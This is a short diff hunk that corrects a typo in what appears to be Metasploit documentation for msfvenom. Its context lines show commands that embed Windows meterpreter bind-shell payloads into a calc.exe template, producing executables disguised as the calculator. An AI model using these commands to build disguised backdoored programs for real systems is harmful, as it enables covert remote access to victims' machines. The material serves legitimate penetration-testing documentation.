@@ -102,7 +102,7 @@ By default, msfvenom uses templates from the msf/data/templates directory. If yo
 ./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe 
 ```
 
-Please note: If you'd like to create a x64 payload with a custom x64 custom template for Winodws, then instead of the exe format, you should use exe-only:
+Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:
 
 ```
 ./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
